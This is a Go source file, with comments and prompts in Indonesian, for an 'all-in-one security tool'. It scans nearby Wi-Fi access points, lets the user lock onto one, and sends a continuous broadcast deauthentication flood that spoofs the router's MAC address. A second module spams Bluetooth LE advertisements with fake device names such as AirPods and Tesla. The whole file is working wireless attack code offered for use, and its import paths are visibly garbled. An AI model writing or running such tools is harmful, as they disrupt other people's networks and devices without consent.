package main

import (
	"bufio"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"://github.com"
	"://github.com/layers"
	"://github.com/pcap"
)

type APInfo struct {
	SSID  string
	BSSID net.HardwareAddr
}

func main() {
	fmt.Println("==========================================")
	fmt.Println("   ADVANCED GO-SECURITY TOOL (ALL-IN-ONE) ")
	fmt.Println("==========================================")
	fmt.Println("[1] Wi-Fi Scanner & Deauther Flood")
	fmt.Println("[2] Bluetooth LE (BLE) Beacon Spam")
	fmt.Print("Pilih menu (1/2): ")

	reader := bufio.NewReader(os.Stdin)
	menuInput, _ := reader.ReadString('\n')
	menuInput = strings.TrimSpace(menuInput)

	switch menuInput {
	case "1":
		runWifiDeauther(reader)
	case "2":
		runBleBeaconSpam()
	default:
		fmt.Println("[-] Pilihan menu tidak valid.")
	}
}

// ==========================================
// MODUL 1: WI-FI SCANNER & DEAUTHER
// ==========================================
func runWifiDeauther(reader *bufio.Reader) {
	// TP-Link V1 kamu di Kali Linux biasanya bernama wlan0mon setelah airmon-ng start
	iface := "wlan0mon" 

	handle, err := pcap.OpenLive(iface, 1024, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("[-] Gagal membuka %s: %v. Apakah sudah sudo & monitor mode?", iface, err)
	}
	defer handle.Close()

	discoveredAPs := make(map[string]APInfo)

	fmt.Println("\n[+] Memulai scanning jaringan Wi-Fi selama 15 detik...")
	go channelHopper(iface)

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	stopScan := time.After(15 * time.Second)

LoopScan:
	for {
		select {
		case <-stopScan:
			break LoopScan
		case packet := <-packetSource.Packets():
			dot11Layer := packet.Layer(layers.LayerTypeDot11)
			if dot11Layer == nil {
				continue
			}
			dot11, _ := dot11Layer.(*layers.Dot11)

			// Deteksi Beacon Frame (Sinyal identitas Router)
			if dot11.Type == layers.Dot11TypeMgmtBeacon {
				bssid := dot11.Address3
				ssid := "[Hidden/No Name SSID]"

				// Parsing nama SSID dari paket
				for _, layer := range packet.Layers() {
					if layer.LayerType() == layers.LayerTypeDot11InformationElement {
						info, ok := layer.(*layers.Dot11InformationElement)
						if ok && info.ID == layers.Dot11InformationElementIDSSID {
							if len(info.Info) > 0 {
								ssid = string(info.Info)
							}
						}
					}
				}

				discoveredAPs[bssid.String()] = APInfo{
					SSID:  ssid,
					BSSID: bssid,
				}
			}
		}
	}

	if len(discoveredAPs) == 0 {
		fmt.Println("[-] Tidak ada jaringan Wi-Fi yang ditemukan. Cek posisi antena USB-mu.")
		return
	}

	fmt.Println("\n=== DAFTAR JARINGAN WI-FI YANG TERDETEKSI ===")
	apList := make([]APInfo, 0, len(discoveredAPs))
	i := 1
	for _, ap := range discoveredAPs {
		fmt.Printf("[%d] SSID: %-25s | MAC/BSSID: %s\n", i, ap.SSID, ap.BSSID.String())
		apList = append(apList, ap)
		i++
	}

	fmt.Print("\nPilih nomor router target yang ingin di-Deauth: ")
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)
	choice, err := strconv.Atoi(input)

	if err != nil || choice < 1 || choice > len(apList) {
		fmt.Println("[-] Pilihan tidak valid.")
		return
	}

	targetAP := apList[choice-1]
	fmt.Printf("\n[!] TARGET DIKUNCI: %s (%s)\n", targetAP.SSID, targetAP.BSSID.String())

	// Susun paket Deautentikasi standar 802.11
	broadcastMac, _ := net.ParseMAC("FF:FF:FF:FF:FF:FF")
	radiotapLayer := &layers.RadioTap{}
	dot11Layer := &layers.Dot11{
		Address1: broadcastMac,     // Target: Semua client yang terhubung ke AP tersebut
		Address2: targetAP.BSSID,    // Mengkloning MAC Address Router (Spoofing)
		Address3: targetAP.BSSID,
		Type:     layers.Dot11TypeMgmtDeauthentication,
	}
	deauthLayer := &layers.Dot11MgmtDeauthentication{
		Reason: layers.Dot11ReasonClass2FromNonAuthSTA, // Alasan pemutusan palsu
	}

	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{}
	gopacket.SerializeLayers(buffer, options, radiotapLayer, dot11Layer, deauthLayer)
	deauthPacket := buffer.Bytes()

	fmt.Println("[+] Mengirim Deauth Flood... Tekan Ctrl+C untuk berhenti.")
	for {
		err := handle.WritePacketData(deauthPacket)
		if err != nil {
			log.Println("Gagal mengirim paket deauth:", err)
		}
		time.Sleep(50 * time.Millisecond) // Mengirim paket tiap 50ms (Flood berkelanjutan)
	}
}

// Fungsi otomatisasi lompat channel Wi-Fi 2.4Ghz
func channelHopper(iface string) {
	channels := []string{"1", "6", "11", "2", "3", "4", "5", "7", "8", "9", "10", "12", "13"}
	for {
		for _, ch := range channels {
			exec.Command("iwconfig", iface, "channel", ch).Run()
			time.Sleep(250 * time.Millisecond)
		}
	}
}

// ==========================================
// MODUL 2: BLUETOOTH LE BEACON SPAM
// ==========================================
func runBleBeaconSpam() {
	fmt.Println("\n[+] Menginisialisasi Interface Bluetooth lokal (hci0)...")
	exec.Command("hciconfig", "hci0", "up").Run()

	fmt.Println("[+] Menjalankan BLE Beacon Spam (Serangan Pop-up Palsu)...")
	fmt.Println("[+] Tekan Ctrl+C untuk menghentikan serangan.")

	// Daftar nama spoofing perangkat BLE acak
	fakeNames := []string{
		"hi1", "Apple Vision Pro", "Not Your Airpods", 
		"Pixel Buds Pro", "Galaxy Buds Pro", "Tesla Model 3",
	}

	// Menggunakan math/rand untuk keacakan nama
	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	for {
		chosenName := fakeNames[r.Intn(len(fakeNames))]
		
		// Reset state iklan BLE sebelumnya
		exec.Command("hcitool", "-i", "hci0", "cmd", "0x08", "0x000a", "00").Run()

		// Set Parameter Periklanan BLE
		exec.Command("hcitool", "-i", "hci0", "cmd", "0x08", "0x0006", "a0", "00", "a0", "00", "03", "00", "00", "00", "00", "00", "00", "00", "00", "07", "00").Run()

		nameBytes := []byte(chosenName)
		nameLen := len(nameBytes)
		
		// Format payload mentah data paket HCI (Flags + Nama Perangkat)
		payloadCmd := fmt.Sprintf("00 02 01 06 %02x 09", nameLen+1)
		for _, b := range nameBytes {
			payloadCmd += fmt.Sprintf(" %02x", b)
		}

		// Padding sisa byte data kosong (total kapasitas 32 byte)
		currentLength := 4 + 2 + nameLen
		for i := currentLength; i < 32; i++ {
			payloadCmd += " 00"
		}

		// Inject data ke modul Bluetooth
		args := append([]string{"-i", "hci0", "cmd", "0x08", "0x0008"}, strings.Fields(payloadCmd)...)
		exec.Command("hcitool", args...).Run()

		// Aktifkan Periklanan BLE (Advertising)
		exec.Command("hcitool", "-i", "hci0", "cmd", "0x08", "0x000a", "01").Run()

		// Berpindah identitas nama iklan setiap 300ms untuk membingungkan sinyal sekitar
		time.Sleep(300 * time.Millisecond)
	}
}

